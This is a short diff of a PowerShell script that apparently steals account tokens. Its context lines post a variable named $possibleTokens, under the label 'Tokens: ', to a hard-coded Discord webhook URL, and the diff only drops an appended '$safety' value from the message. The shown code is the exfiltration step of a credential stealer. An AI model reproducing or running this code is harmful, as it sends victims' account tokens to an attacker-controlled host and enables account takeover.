@@ -206,6 +206,6 @@ $hookUrl = 'https://discord.com/api/webhooks/889662758910574662/aHaHRR3GFmiFr-wD
 
 $Body = @{
   'username' = 'Tokens: '
-  'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String + $safety
+  'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String
 }
 Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
